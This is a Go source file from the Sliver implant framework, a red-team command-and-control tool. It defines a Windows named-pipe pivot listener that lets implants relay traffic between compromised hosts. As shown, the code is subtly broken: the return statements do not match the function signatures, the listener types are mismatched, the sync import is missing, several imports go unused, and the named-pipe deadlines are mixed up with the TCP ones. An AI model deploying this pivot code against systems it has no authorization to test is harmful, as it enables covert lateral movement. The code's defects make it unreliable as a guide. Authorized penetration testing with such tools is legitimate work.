package pivots

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"math/rand"
	"net"
	"os"
	"strings"
	"time"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"github.com/bishopfox/sliver/implant/sliver/transports"
	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/lesnuages/go-winio"
	"google.golang.org/protobuf/proto"
)

var (
	namedPipePivotReadDeadline  = 10 * time.Second
	namedPipePivotWriteDeadline = 10 * time.Second
)

// StartNamedPipePivotListener - Starts a named pipe listener
func StartNamedPipePivotListener(pipeName string, upstream <-chan *pb.Envelope) (*PivotListener, error) {
	fullName := "\\\\.\\pipe\\" + pipeName
	config := &winio.PipeConfig{
		RemoteClientMode: true,
	}
	ln, err := winio.ListenPipe(fullName, config)
	// {{if .Config.Debug}}
	log.Printf("Listening on %s", fullName)
	// {{end}}
	if err != nil {
		return err
	}
	go namedPipeAcceptConnections(ln)
	return &PivotListener{
		ID:          ListenerID(),
		Type:        pb.PivotType_NamedPipe,
		Listener:    ln,
		Pivots:      &sync.Map{},
		BindAddress: fullName,
		upstream:    upstream,
	}, nil
}

func namedPipeAcceptConnections(pivotListener *PivotListener) {
	hostname, err := os.Hostname()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Failed to determine hostname %s", err)
		// {{end}}
		hostname = "."
	}
	namedPipe := strings.ReplaceAll(pivotListener.Listener.Addr().String(), ".", hostname)
	for {
		conn, err := pivotListener.Listener.Accept()
		if err != nil {
			continue
		}
		// handle connection like any other net.Conn
		pivotConn := &NetConnPivot{
			id:            PivotID(),
			conn:          conn,
			readMutex:     &sync.Mutex{},
			writeMutex:    &sync.Mutex{},
			readDeadline:  tcpPivotReadDeadline,
			writeDeadline: tcpPivotWriteDeadline,
		}
		go func() {
			// Do not add to pivot listener until key exchange is successful
			err = pivotConn.Start()
			if err == nil {
				pivotListener.Pivots.Store(pivotConn.ID(), pivotConn)
			}
		}()
	}
}
